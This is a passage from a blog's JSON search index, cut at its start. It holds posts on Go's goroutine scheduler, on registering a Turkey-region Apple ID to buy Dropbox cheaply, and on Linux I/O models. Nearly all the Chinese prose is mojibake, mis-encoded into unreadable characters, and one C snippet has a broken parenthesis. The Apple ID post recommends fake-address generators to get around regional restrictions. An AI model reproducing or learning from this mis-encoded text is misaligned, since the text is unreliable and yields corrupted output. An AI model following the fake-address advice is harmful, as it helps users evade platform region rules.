æ¯ä¸ª P æœ‰è‡ªå·±çš„æœ¬åœ°é˜Ÿåˆ—ï¼Œè€Œä¸æ˜¯æ‰€æœ‰çš„ G æ“ä½œéƒ½è¦ç»è¿‡å…¨å±€çš„ G é˜Ÿåˆ—ï¼Œè¿™æ ·é”çš„ç«äº‰ä¼šå°‘çš„å¤šçš„å¤šã€‚è€Œ GM æ¨¡å‹çš„æ€§èƒ½å¼€é”€å¤§å¤´å°±æ˜¯é”ç«äº‰ã€‚\n+ æ¯ä¸ª P ç›¸å¯¹çš„å¹³è¡¡ä¸Šï¼Œåœ¨ GMP æ¨¡å‹ä¸­ä¹Ÿå®ç°äº† Work Stealing ç®—æ³•ï¼Œå¦‚æœ P çš„æœ¬åœ°é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™ä¼šä»å…¨å±€é˜Ÿåˆ—æˆ–å…¶ä»– P çš„æœ¬åœ°é˜Ÿåˆ—ä¸­çªƒå–å¯è¿è¡Œçš„ G æ¥è¿è¡Œï¼Œå‡å°‘ç©ºè½¬ï¼Œæé«˜äº†èµ„æºåˆ©ç”¨ç‡ã€‚\n+  hand off æœºåˆ¶å½“ M0 çº¿ç¨‹å› ä¸º G1 è¿›è¡Œç³»ç»Ÿè°ƒç”¨é˜»å¡æ—¶ï¼Œçº¿ç¨‹é‡Šæ”¾ç»‘å®šçš„ Pï¼ŒæŠŠ P è½¬ç§»ç»™å…¶ä»–ç©ºé—²çš„çº¿ç¨‹ M1 æ‰§è¡Œï¼ŒåŒæ ·ä¹Ÿæ˜¯æé«˜äº†èµ„æºåˆ©ç”¨ç‡ã€‚\n\n### 5.3 å•æ ¸ CPUï¼Œå¼€ä¸¤ä¸ª Goroutineï¼Œå…¶ä¸­ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¼šæ€ä¹ˆæ ·ï¼Ÿ\n\n```go\nfunc main() {\n    // æ¨¡æ‹Ÿå•æ ¸ CPU\n    runtime.GOMAXPROCS(1)\n    \n    // æ¨¡æ‹Ÿ Goroutine æ­»å¾ªç¯\n    go func() {\n        for {\n        }\n    }()\n    time.Sleep(time.Second)\n    fmt.Println(\"å“ˆå“ˆ\")\n}\n```\n\n- åœ¨ Go1.14 å‰ï¼Œä¸ä¼šè¾“å‡ºä»»ä½•ç»“æœã€‚\n- åœ¨ Go1.14 åŠä¹‹åï¼Œèƒ½å¤Ÿæ­£å¸¸è¾“å‡ºç»“æœã€‚(åœ¨ Go1.14 å®ç°äº†åŸºäºä¿¡å·çš„æŠ¢å å¼è°ƒåº¦)\n\n### 5.4 æ€»ç»“\n\n+ é¦–å…ˆåç¨‹å’Œè¿›ç¨‹æ˜¯Mï¼šNçš„å…³ç³»ï¼Œåç¨‹æœ€ç»ˆè¿è¡Œåœ¨çº¿ç¨‹é‡Œï¼Œé€šè¿‡goè°ƒåº¦ã€‚\n+ G: gorotuineï¼ŒM: threads  Pï¼šprocessor(å¤„ç†å™¨)ã€‚\n+ Pç”±GOMAXPROCS() å†³å®šçš„ï¼Œå¸¦ä¸€ä¸ªé˜Ÿåˆ—æ”¾ç€ä¸€å †Gï¼ŒPä¼šå’ŒMç»‘å®šã€‚è¿˜æœ‰ä¸€ä¸ªå…¨å±€é˜Ÿåˆ—ã€‚\n+ åˆ›å»ºgoçš„æ—¶å€™ï¼Œå…ˆä¼šåŠ åˆ°Pçš„æœ¬åœ°ï¼Œæ»¡äº†ä¸Šå…¨å±€ã€‚\n+ ä¸€ä¸ªæ˜¯å·å–æœºåˆ¶ã€‚Mè¿è¡Œæ—¶ï¼Œå…ˆä»Pçš„æœ¬åœ°æ‹¿Gã€‚æ²¡æœ‰å…¨å±€æ‹¿Gï¼Œæ²¡æœ‰ä»åˆ«çš„På·ä¸€åŠGã€‚\n+ ä¸€ä¸ªæ˜¯é˜»å¡ç§»äº¤æœºåˆ¶ã€‚å¦‚æœgoé˜»å¡è°ƒç”¨äº†ï¼ŒPè¿˜ä¼šå’ŒMè§£ç»‘ã€‚Pæ‰¾ç©ºé—²çš„Mç»„åˆã€‚ç­‰é˜»å¡ç»“æŸï¼Œå¦‚æœæ²¡æ‰¾åˆ°Pï¼ŒæŠŠGæ”¾å…¨å±€é˜Ÿåˆ—ï¼ŒMä¼‘çœ ã€‚\n\n\n# 6. å‚è€ƒèµ„æ–™\n+ https://learnku.com/articles/41728\n+ https://draveness.me/golang/docs/part3-runtime/ch06-concurrency/golang-goroutine/\n+ [ä¸€é“é—®é¢˜å¼•å‘çš„golangè°ƒåº¦](https://txiner.top/post/ä¸€é“é—®é¢˜å¼•å‘çš„golangè°ƒåº¦/)\n+ https://juejin.cn/post/6968311281220583454\n\n  \n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"åœŸè€³å…¶applestoreè´­ä¹°dropbox","url":"%2Fp%2F39009612.html","content":"\n\n\n# 1. åœŸåŒºApple ID\n\n### 1.1 æ³¨å†Œ\n\nåœ¨Â [https://appleid.apple.com/](https://appleid.apple.com/)Â ä¸Šé¢æ³¨å†Œï¼Œæ³¨å†Œæ—¶åœ°åŒºé€‰æ‹©åœŸè€³å…¶ï¼Œæ‰‹æœºå·ç”¨å›½å†…çš„æ‰‹æœºå·å°±å¯ä»¥ã€‚\n\nåœ°å€ç”Ÿæˆå™¨ï¼š https://www.addresscopy.com/Turkey\n\n### 1.2 å……å€¼\n\nå……å€¼çš„è¯åœ¨æ·˜å®è´­ä¹°ç¤¼å“å¡æˆ–è€…ä¸€äº›ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸Šè´­ä¹°éƒ½å¯ä»¥ï¼Œæˆ‘æ˜¯ç”¨æ¥è®¢é˜…çš„ï¼Œæ‰€ä»¥è´¦å·å°äº†ä¹Ÿæ— æ‰€è°“ã€‚å¦‚æœä½ æƒ³å¤§é‡è´­ä¹°è½¯ä»¶ï¼Œè¯·è‡ªè¡Œå¯»æ‰¾å®‰å…¨çš„ç¤¼å“å¡è´­ä¹°æ¸ é“ã€‚å¯ä»¥å…ˆå……å€¼ 25 é‡Œæ‹‰è¯•ä¸€ä¸‹èƒ½å¦æ¶ˆè´¹å†å¤§é‡å……å€¼ã€‚\n\n### 1.3 æ¶ˆè´¹\n\nåœŸåŒºå› ä¸ºæ±‡ç‡é—®é¢˜å¾ˆå¤šå†…è´­éƒ½æ¯”å…¶ä»–åŒºä¾¿å®œï¼Œä»¥ Telegram ä¼šå‘˜ä¸¾ä¾‹ï¼Œç¾åŒº $4.99 ï¼ŒåœŸåŒº 13.99 é‡Œæ‹‰ï¼ŒæŠ˜åˆäººæ°‘å¸ 5 å—å¤šã€‚ä½†æ˜¯ tg ä¼šå‘˜åªèƒ½å†²åˆ°è‡ªå·±å·ä¸Šï¼Œèµ é€è¿˜æ˜¯ç¾åŒºçš„ä»·æ ¼ã€‚åœŸåŒºçš„å„ç§ä¼šå‘˜éƒ½å¾ˆä¾¿å®œï¼Œå¯ä»¥è‡ªå·±æ¢ç´¢æˆ–è€…ä¸Šç½‘æœç´¢ï¼Œä½†æ˜¯å›½å†…çš„ä¼šå‘˜åŸºæœ¬ä¸Šæ²¡æœ‰åœŸåŒºç‰¹æƒã€‚\n\n<!-- more -->\n\n### 1.4 ç¤¼å“å¡æ”¯ä»˜\n\nå¯ä»¥ç™»å½•ç½‘é¡µç‰ˆå°†ä»˜æ¬¾ä¿¡æ¯æ”¹ä¸ºâ€œæ— â€ï¼Œç™¾åº¦æœç´¢åœŸåŒºåœ°å€å’Œç”µè¯å¡«å†™è¿›å»å³å¯ç»§ç»­ä½¿ç”¨ä½™é¢æ”¯ä»˜ã€‚\n\n æ˜¯å»è‹¹æœå®˜ç½‘è´¦å·ç®¡ç†ï¼Œæ·»åŠ æ”¯ä»˜ä¿¡æ¯è´¦å•ä¿¡æ¯ï¼Œæ”¯ä»˜æ–¹å¼é€‰æ‹©æ— ï¼Œç„¶å ios åº”è¯¥å°±å¯ä»¥ä½™é¢ä»˜äº†ã€‚\n\n\n\n# 2. ç¤¼å“å¡\n\nä»‹ç»ï¼šhttps://yummy.best/turkey-giftcard/\n\næ±‡ç‡ï¼šhttps://www.google.com.hk/search?q=%E6%B1%87%E7%8E%87%E5%85%91%E6%8D%A2\n\n\n\n### 2.1 è´­ä¹°åœ°å€\n\nhttps://www.oyunfor.com/apple-store/apple-store-itunes-gift-card\n\nhttps://www.turgame.com/itunes-gift-cards/\n\nhttps://www.mtcgame.com/zh-CN/apple-store/itunes-hediye-karti  **ï¼ï¼ä¸ä»…æº¢ä»·ï¼Œè¿˜è¦æ‰‹æŒç…§ç‰‡è®¤è¯ï¼Œå‘çˆ¹ä¸è¦ç”¨ï¼ï¼**\n\n\n\n# 3. dropbox\n\n### 3.1 è´­ä¹°\n\n1. æ–°å·->  dropboxç½‘é¡µè¯•ç”¨plusä¼šå‘˜ä¸€ä¸ªæœˆ-> å–æ¶ˆè¯•ç”¨\n2. ç™»å½•iOS dropbox è´¦å·ï¼Œç‚¹å‡»å‡çº§ï¼Œè®¢é˜…ä»˜è´¹å³å¯ã€‚\n3. è®¢é˜…ååœ¨ app store é‡Œæ‰¾åˆ°ç°æœ‰è®¢é˜…ï¼Œç‚¹è¿›å»ï¼Œæœ‰ä¸ªé€‰é¡¹ see all plans ï¼Œé‡Œé¢å¯ä»¥æ¢æˆ pro ç‰ˆå¹´ä»˜ã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.v2ex.com/t/881793ã€åœŸåŒº Apple ID æ³¨å†Œæ¶ˆè´¹æ–¹æ³•ã€‘\n\n- https://www.v2ex.com/t/879134 ã€å¦‚ä½•æ­£ç¡®çš„æ³¨å†ŒåœŸè€³å…¶åœ°åŒºçš„ Apple IDï¼Ÿã€‘","categories":["è½¯ä»¶"]},{"title":"linuxçš„ioæ¨¡å‹","url":"%2Fp%2F9864e52a.html","content":"\n# 1. åŸºç¡€æœ¯è¯­\n\nå…ˆæŠ›å‡ºçŸ¥ä¹çš„ä¸€ä¸ªé—®é¢˜:  https://www.zhihu.com/question/59975081\n\nepollæŠ€æœ¯å±äºIOå¤ç”¨ï¼ŒIOå¤ç”¨å±äºåŒæ­¥IOï¼Œæ‰€ä»¥epollå±äºåŒæ­¥IOï¼Œè¿™åº”è¯¥æ˜¯æ²¡æ¯›ç—…çš„ã€‚\n\nç°åœ¨æˆ‘ç”¨äº†ä¸€ä¸ªæ¡†æ¶ï¼Œæ¯”å¦‚twistedï¼Œé‡Œé¢çš„reactoræ¨¡å¼çš„å®ç°æ˜¯åŸºäºepollæˆ–è€…pollçš„ï¼Œåœ¨IOçš„èŒƒç•´åº”è¯¥æ˜¯å±äºåŒæ­¥IOï¼Œä½†æ˜¯ç½‘ä¸Šå‡ ä¹æ‰€æœ‰çš„æ–‡ç« éƒ½è¯´twistedæ˜¯å¼‚æ­¥çš„ã€‚\n\næˆ‘çš„é—®é¢˜æ˜¯ï¼Œå¼‚æ­¥ä¸å¼‚æ­¥IOæ˜¯ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Ÿæœ‰æ²¡æœ‰å¯èƒ½å¼‚æ­¥å¯ä»¥ç”±åŒæ­¥IO(epollæˆ–poll)å®ç°ï¼Ÿ\n\n<!-- more -->\n\n### 1.1 è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„å±‚æ¬¡\n\nå…³äºåŒæ­¥ã€å¼‚æ­¥ã€é˜»å¡ã€éé˜»å¡åœ¨ã€Šæ“ä½œç³»ç»Ÿæ¦‚å¿µ(ç¬¬ä¹ç‰ˆ)ã€‹ä¸­æœ‰å¦‚ä¸‹è§£é‡Š\n\n<img src=\"linuxçš„ioæ¨¡å‹/v2-d6729b9e95e8f20c4e53215327596692_720w.jpg\" alt=\"img\" style=\"zoom:90%;\" />\n\nè¿›ç¨‹é—´çš„é€šä¿¡æ˜¯é€šè¿‡ send() å’Œ receive() ä¸¤ç§åŸºæœ¬æ“ä½œå®Œæˆçš„ã€‚å…·ä½“å¦‚ä½•å®ç°è¿™ä¸¤ç§åŸºç¡€æ“ä½œï¼Œå­˜åœ¨ç€ä¸åŒçš„è®¾è®¡ã€‚ æ¶ˆæ¯çš„ä¼ é€’æœ‰å¯èƒ½æ˜¯é˜»å¡çš„æˆ–éé˜»å¡çš„ -- ä¹Ÿè¢«ç§°ä¸ºåŒæ­¥æˆ–å¼‚æ­¥çš„ã€‚\n\n- é˜»å¡å¼å‘é€ï¼ˆblocking sendï¼‰. å‘é€æ–¹è¿›ç¨‹ä¼šè¢«ä¸€ç›´é˜»å¡ï¼Œ ç›´åˆ°æ¶ˆæ¯è¢«æ¥å—æ–¹è¿›ç¨‹æ”¶åˆ°ã€‚\n- éé˜»å¡å¼å‘é€ï¼ˆnonblocking sendï¼‰ã€‚ å‘é€æ–¹è¿›ç¨‹è°ƒç”¨ send() åï¼Œ ç«‹å³å°±å¯ä»¥å…¶ä»–æ“ä½œã€‚\n- é˜»å¡å¼æ¥æ”¶ï¼ˆblocking receiveï¼‰ æ¥æ”¶æ–¹è°ƒç”¨ receive() åä¸€ç›´é˜»å¡ï¼Œ ç›´åˆ°æ¶ˆæ¯åˆ°è¾¾å¯ç”¨ã€‚\n- éé˜»å¡å¼æ¥å—ï¼ˆnonblocking receiveï¼‰ æ¥æ”¶æ–¹è°ƒç”¨ receive() å‡½æ•°åï¼Œ è¦ä¹ˆå¾—åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„ç»“æœï¼Œ è¦ä¹ˆå¾—åˆ°ä¸€ä¸ªç©ºå€¼ï¼Œ å³ä¸ä¼šè¢«é˜»å¡ã€‚\n\nä¸Šè¿°ä¸åŒç±»å‹çš„å‘é€æ–¹å¼å’Œä¸åŒç±»å‹çš„æ¥æ”¶æ–¹å¼ï¼Œå¯ä»¥è‡ªç”±ç»„åˆã€‚\n\n**ä¹Ÿå°±æ˜¯è¯´ï¼Œ ä»è¿›ç¨‹çº§é€šä¿¡çš„ç»´åº¦è®¨è®ºæ—¶ï¼Œ é˜»å¡å’ŒåŒæ­¥ï¼ˆéé˜»å¡å’Œå¼‚æ­¥ï¼‰å°±æ˜¯ä¸€å¯¹åŒä¹‰è¯ï¼Œ ä¸”éœ€è¦é’ˆå¯¹å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä½œåŒºåˆ†å¯¹å¾…ã€‚**\n\n\n\n### 1.2 I/O ç³»ç»Ÿè°ƒç”¨çš„å±‚æ¬¡\n\nåœ¨å¤„ç† IO çš„æ—¶å€™ï¼Œé˜»å¡å’Œéé˜»å¡éƒ½æ˜¯åŒæ­¥ IOã€‚\n\n![1](linuxçš„ioæ¨¡å‹/0.png)\n\n#####  é˜»å¡ IO\n\né˜»å¡è¿™ä¸ªè¯æ˜¯ä¸ç³»ç»Ÿè°ƒç”¨ System Call ç´§ç´§è”ç³»åœ¨ä¸€èµ·çš„ï¼Œ å› ä¸ºè¦è®©ä¸€ä¸ªè¿›ç¨‹è¿›å…¥ ç­‰å¾…ï¼ˆwaitingï¼‰ çš„çŠ¶æ€, è¦ä¹ˆæ˜¯å®ƒä¸»åŠ¨è°ƒç”¨ wait() æˆ– sleep() ç­‰æŒ‚èµ·è‡ªå·±çš„æ“ä½œï¼Œ å¦ä¸€ç§å°±æ˜¯å®ƒè°ƒç”¨ System Call, è€Œ System Call å› ä¸ºæ¶‰åŠåˆ°äº† I/O æ“ä½œï¼Œ ä¸èƒ½ç«‹å³å®Œæˆï¼Œ äºæ˜¯å†…æ ¸å°±ä¼šå…ˆå°†è¯¥è¿›ç¨‹ç½®ä¸ºç­‰å¾…çŠ¶æ€ï¼Œ è°ƒåº¦å…¶ä»–è¿›ç¨‹çš„è¿è¡Œï¼Œ ç­‰åˆ° å®ƒæ‰€è¯·æ±‚çš„ I/O æ“ä½œå®Œæˆäº†ä»¥åï¼Œ å†å°†å…¶çŠ¶æ€æ›´æ”¹å› ready ã€‚\n\n```c\nlistenfd = socket();   // æ‰“å¼€ä¸€ä¸ªç½‘ç»œé€šä¿¡ç«¯å£\nbind(listenfd);        // ç»‘å®š\nlisten(listenfd);      // ç›‘å¬\nwhile(1) {\n  connfd = accept(listenfd);  // é˜»å¡å»ºç«‹è¿æ¥\n  int n = read(connfd, buf);  // é˜»å¡è¯»æ•°æ®\n  doSomeThing(buf);  // åˆ©ç”¨è¯»åˆ°çš„æ•°æ®åšäº›ä»€ä¹ˆ\n  close(connfd);     // å…³é—­è¿æ¥ï¼Œå¾ªç¯ç­‰å¾…ä¸‹ä¸€ä¸ªè¿æ¥\n}\n```\n\n\n\n##### éé˜»å¡ IO \n\nç°åœ¨çš„å¤§éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿä¼šæä¾›éé˜»å¡I/O ç³»ç»Ÿè°ƒç”¨æ¥å£ï¼ˆNonblocking I/O system callï¼‰ã€‚ ä¸€ä¸ªéé˜»å¡è°ƒç”¨ä¸ä¼šæŒ‚èµ·è°ƒç”¨ç¨‹åºï¼Œ è€Œæ˜¯ä¼šç«‹å³è¿”å›ä¸€ä¸ªå€¼ï¼Œ è¡¨ç¤ºæœ‰å¤šå°‘bytes çš„æ•°æ®è¢«æˆåŠŸè¯»å–ï¼ˆæˆ–å†™å…¥ï¼‰ã€‚\n\n```c\nfcntl(connfd, F_SETFL, O_NONBLOCK);\nint n = read(connfd, buffer) != SUCCESS);\n```\n\n\n\n### 1.3 å‰æ–‡é—®é¢˜è§£ç­”\n\nç®€å•è¯´ä¸€å¥è¯ï¼Œä½ éœ€è¦åˆ†å±‚çœ‹è¿™ä¸ªäº‹ã€‚\n\nepoll è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ˜¯åŒæ­¥çš„ï¼Œä¹Ÿå°±æ˜¯å¿…é¡»ç­‰å¾…æ“ä½œç³»ç»Ÿè¿”å›å€¼ã€‚è€Œåº•å±‚ç”¨äº† epoll çš„å°è£…åçš„æ¡†æ¶ï¼Œå¯ä»¥æ˜¯å¼‚æ­¥çš„ï¼Œåªè¦ä½ æš´éœ²ç»™å¤–éƒ¨çš„æ¥å£ï¼Œæ— éœ€ç­‰å¾…ä½ çš„è¿”å›å€¼å³å¯ã€‚\n\nå†å¤šè¯´äº›ï¼Œepoll è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„åº•å±‚å†…æ ¸è®¾è®¡é‡Œï¼Œæ¯ä¸ª IO äº‹ä»¶çš„é€šçŸ¥ç­‰å¾…ï¼Œæ˜¯å¼‚æ­¥çš„ã€‚ä½†è¿™ä¸å½±å“ï¼Œepoll è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹å¤–éƒ¨æ¥è¯´ï¼Œæ˜¯ä¸€ä¸ªåŒæ­¥çš„æ¥å£ã€‚\n\næ‰€ä»¥ä½ è¯´ï¼Œæœ‰çš„åœ°æ–¹è¯´åŒæ­¥ï¼Œæœ‰çš„åœ°æ–¹è¯´å¼‚æ­¥ï¼Œå…¶å®æ˜¯ä¸åŒåˆ†å±‚çš„è§†è§’çœ‹ã€‚\n\n\n\n# 2. Linuxä¸‹çš„äº”ç§I/Oæ¨¡å‹(apue)\n\nLinuxä¸‹ä¸»è¦æœ‰ä»¥ä¸‹äº”ç§I/Oæ¨¡å‹ï¼š\n\n1. é˜»å¡I/Oï¼ˆblocking IOï¼‰\n2. éé˜»å¡I/O (nonblocking I/O)\n3. I/O å¤ç”¨ (I/O multiplexing)ï¼ˆselectã€pollã€linux 2.6ç§æ”¹è¿›çš„epollï¼‰\n4. ä¿¡å·é©±åŠ¨I/O (signal driven I/O (SIGIO))\n5. å¼‚æ­¥I/O (asynchronous I/O)\n\n\n\n### 2.1 é˜»å¡IO æ¨¡å‹\n\n> æœ€å‚»ï¼Œä¸èƒ½å¿ã€‚\n\nè¿›ç¨‹ä¼šä¸€ç›´é˜»å¡ï¼Œç›´åˆ°æ•°æ®æ‹·è´å®Œæˆ åº”ç”¨ç¨‹åºè°ƒç”¨ä¸€ä¸ªIOå‡½æ•°ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºé˜»å¡ï¼Œç­‰å¾…æ•°æ®å‡†å¤‡å¥½ã€‚æ•°æ®å‡†å¤‡å¥½åï¼Œä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼ŒIOå‡½æ•°è¿”å›æˆåŠŸæŒ‡ç¤ºã€‚\n\n![1](linuxçš„ioæ¨¡å‹/1.png)\n\n\n\n### 2.2 éé˜»å¡IOæ¨¡å‹\n\n> å¾ªç¯è°ƒç”¨è¯¢é—®ï¼Œ OKäº†å¼€å§‹æ‹·è´ï¼Œæ‹·è´ä¸­éœ€è¦ç­‰å¾…ã€‚\n\né€šè¿‡è¿›ç¨‹åå¤è°ƒç”¨IOå‡½æ•°ï¼Œ**åœ¨æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´è¿‡ç¨‹ä¸­ï¼Œè¿›ç¨‹æ˜¯é˜»å¡çš„ã€‚**\n\n![1](linuxçš„ioæ¨¡å‹/2.png)\n\n### 2.3 IOå¤ç”¨æ¨¡å‹\n\n> okäº†è¢«é€šçŸ¥ï¼Œ æ‹·è´ä¸­éœ€è¦ç­‰å¾…ã€‚\n\nä¸»è¦æ˜¯selectå’Œepollã€‚ä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¯¹å¤šä¸ªIOç«¯å£è¿›è¡Œç›‘å¬ï¼Œå½“socketæœ‰è¯»å†™äº‹ä»¶æ—¶åˆ†å‘åˆ°å…·ä½“çš„çº¿ç¨‹è¿›è¡Œå¤„ç†ã€‚\n\n![1](linuxçš„ioæ¨¡å‹/3.png)\n\n\n\n### 2.4 ä¿¡å·é©±åŠ¨IOæ¨¡å‹\n\n> okäº†è¢«é€šçŸ¥ï¼Œæ‹·è´ä¸­éœ€è¦ç­‰å¾…ã€‚\n\né¦–å…ˆæˆ‘ä»¬å…è®¸Socketè¿›è¡Œä¿¡å·é©±åŠ¨IO,å¹¶å®‰è£…ä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼Œè¿›ç¨‹ç»§ç»­è¿è¡Œå¹¶ä¸é˜»å¡ã€‚å½“æ•°æ®å‡†å¤‡å¥½æ—¶ï¼Œè¿›ç¨‹ä¼šæ”¶åˆ°ä¸€ä¸ªSIGIOä¿¡å·ï¼Œå¯ä»¥åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­è°ƒç”¨I/Oæ“ä½œå‡½æ•°å¤„ç†æ•°æ®ã€‚\n\n![1](linuxçš„ioæ¨¡å‹/4.png)\n\n### 2.5 å¼‚æ­¥IOæ¨¡å‹\n\n> okäº†è¢«é€šçŸ¥ï¼Œæ‹·è´å®Œæˆåè¢«é€šçŸ¥ã€‚\n\nç›¸å¯¹äºåŒæ­¥IOï¼Œå¼‚æ­¥IOä¸æ˜¯é¡ºåºæ‰§è¡Œã€‚ç”¨æˆ·è¿›ç¨‹è¿›è¡Œaio_readç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œæ— è®ºå†…æ ¸æ•°æ®æ˜¯å¦å‡†å¤‡å¥½ï¼Œéƒ½ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·è¿›ç¨‹ï¼Œç„¶åç”¨æˆ·æ€è¿›ç¨‹å¯ä»¥å»åšåˆ«çš„äº‹æƒ…ã€‚**ç­‰åˆ°socketæ•°æ®å‡†å¤‡å¥½äº†ï¼Œå†…æ ¸ç›´æ¥å¤åˆ¶æ•°æ®ç»™è¿›ç¨‹ï¼Œç„¶åä»å†…æ ¸å‘è¿›ç¨‹å‘é€é€šçŸ¥ã€‚IOä¸¤ä¸ªé˜¶æ®µï¼Œè¿›ç¨‹éƒ½æ˜¯éé˜»å¡çš„ã€‚**\n\n![1](linuxçš„ioæ¨¡å‹/5.png)\n\n\n\n\n\n# 3. éé˜»å¡IOä¸ºä»€ä¹ˆæ˜¯åŒæ­¥IO?\n\n### 3.1 åŒæ­¥IOå’Œå¼‚æ­¥IOçš„åŒºåˆ«\n\nA synchronous I/O operation causes the requesting process to be blocked until that I/O operation completes;\nAn asynchronous I/O operation does not cause the requesting process to be blocked;\n\nä¸¤è€…çš„åŒºåˆ«å°±åœ¨äºåŒæ­¥IO åš IOæ“ä½œçš„æ—¶å€™ä¼šå°†processé˜»å¡ã€‚\n\n\n\næŒ‰ç…§è¿™ä¸ªå®šä¹‰ï¼Œä¹‹å‰æ‰€è¿°çš„blocking IOï¼Œnon-blocking IOï¼ŒIO multiplexingéƒ½å±äºsynchronous IOã€‚æ³¨æ„åˆ°non-blocking IOä¼šä¸€ç›´è½®è¯¢(polling)ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯æ²¡æœ‰é˜»å¡çš„ï¼Œä½†æ˜¯recvfromé˜¶æ®µblocking IO,non-blocking IOå’ŒIO multiplexingéƒ½æ˜¯é˜»å¡çš„ã€‚\n\nè€Œasynchronous IOåˆ™ä¸ä¸€æ ·ï¼Œå½“è¿›ç¨‹å‘èµ·IO æ“ä½œä¹‹åï¼Œå°±ç›´æ¥è¿”å›å†ä¹Ÿä¸ç†ç¬äº†ï¼Œç›´åˆ°kernelå‘é€ä¸€ä¸ªä¿¡å·ï¼Œå‘Šè¯‰è¿›ç¨‹è¯´IOå®Œæˆã€‚åœ¨è¿™æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œè¿›ç¨‹å®Œå…¨æ²¡æœ‰è¢«blockã€‚\n\n\n\n### 3.2 éé˜»å¡IOåœ¨å†…æ ¸æ‹·è´æ•°æ®ä¸­æ˜¯é˜»å¡çš„\n\nPOSIXæŠŠI/Oæ“ä½œåˆ’åˆ†æˆä¸¤ç±»ï¼š\n\n- åŒæ­¥I/O: åŒæ­¥I/Oæ“ä½œå¯¼è‡´è¯·æ±‚è¿›ç¨‹é˜»å¡ï¼Œç›´è‡³æ“ä½œå®Œæˆ\n\n- å¼‚æ­¥I/O: å¼‚æ­¥I/Oæ“ä½œä¸å¯¼è‡´è¯·æ±‚é˜»å¡\n  \n\næ‰€ä»¥Unixçš„å‰å››ç§I/Oæ¨¡å‹éƒ½æ˜¯åŒæ­¥I/O, åªæœ‰æœ€åä¸€ç§æ‰æ˜¯å¼‚æ­¥I/Oã€‚\n\n+ é˜»å¡IOæ¨¡å‹ï¼Œéé˜»å¡IOæ¨¡å‹ï¼ŒIOå¤ç”¨æ¨¡å‹ï¼Œä¿¡å·é©±åŠ¨IOæ¨¡å‹éƒ½æ˜¯åŒæ­¥IOã€‚ \n+ éé˜»å¡ä¹‹æ‰€ä»¥æ˜¯åŒæ­¥ï¼Œæ˜¯å› ä¸ºrecvfromä¼šå°†æ•°æ®ä»kernelæ‹·è´åˆ°ç”¨æˆ·å†…å­˜ä¸­ï¼Œè¿™ä¸ªæ—¶å€™è¿›ç¨‹æ˜¯è¢«blockäº†ï¼Œåœ¨è¿™æ®µæ—¶é—´å†…ï¼Œè¿›ç¨‹æ˜¯è¢«blockçš„ã€‚\n\n![1](linuxçš„ioæ¨¡å‹/6.png)\n\n\n\n\n\n# 4.1 Java IO å’Œ Linux IO\n\n### 1. Java IO\n\n+ BIO(Blocking I/O)\n\n+ NIO(Non-blocking I/O)\n\n  åœ¨Javaé¢†åŸŸï¼Œä¹Ÿç§°ä¸ºNew I/Oã€‚ \n\n  Java NIO ([JSR 51](https://www.jcp.org/en/jsr/detail?id=51))å®šä¹‰äº†Java new I/O APIï¼Œææ¡ˆ2000å¹´æå‡º,2002å¹´æ­£å¼å‘å¸ƒã€‚ JDK 1.4èµ·åŒ…å«äº†ç›¸åº”çš„APIå®ç°ã€‚ \n\n+ AIO(Asynchronous I/O)\n\n  JAVA NIO2 ([JSR 203](https://www.jcp.org/en/jsr/detail?id=203))å®šä¹‰äº†æ›´å¤šçš„ New I/O APIsï¼Œ ææ¡ˆ2003æå‡ºï¼Œç›´åˆ°2011å¹´æ‰å‘å¸ƒï¼Œ æœ€ç»ˆåœ¨JDK 7ä¸­æ‰å®ç°ã€‚\n\nå½“å‰å¾ˆå¤šçš„é¡¹ç›®è¿˜åœç•™åœ¨JAVA NIOçš„å®ç°ä¸Šï¼Œ å¯¹JAVA AIO(asynchronous I/O)ç€å¢¨ä¸å¤šã€‚\n\n### 2. å’ŒLinux IO å¯¹åº”å…³ç³»\n\nå†æ¬¡é‡å¤linuxçš„å‰å››ç§I/Oæ¨¡å‹éƒ½æ˜¯åŒæ­¥I/O, åªæœ‰æœ€åä¸€ç§æ‰æ˜¯å¼‚æ­¥I/Oã€‚\n\n+ ä¼ ç»Ÿçš„Java BIO (blocking I/O)æ˜¯Unix I/Oæ¨¡å‹ä¸­çš„ç¬¬ä¸€ç§ã€‚\n+ Java NIOä¸­å¦‚æœä¸ä½¿ç”¨selectæ¨¡å¼ï¼Œè€ŒåªæŠŠchannelé…ç½®æˆnonblockingåˆ™æ˜¯ç¬¬äºŒç§æ¨¡å‹ã€‚\n+ Java NIO selectå®ç°çš„æ˜¯ä¸€ç§å¤šè·¯å¤ç”¨I/Oã€‚ åº•å±‚ä½¿ç”¨epollæˆ–è€…ç›¸åº”çš„pollç³»ç»Ÿè°ƒç”¨ã€‚\n+ ç¬¬å››ç§æ¨¡å‹JDKåº”è¯¥æ˜¯æ²¡æœ‰å®ç°ã€‚\n+ Java NIO2å¢åŠ äº†å¯¹ç¬¬äº”ç§æ¨¡å‹çš„æ”¯æŒï¼Œä¹Ÿå°±æ˜¯AIOã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.liuvv.com/p/457c2d1f.html\n\n+ https://www.zhihu.com/question/19732473/answer/117012135\n\n+  https://www.zhihu.com/question/59975081/answer/1932776593\n\n+ 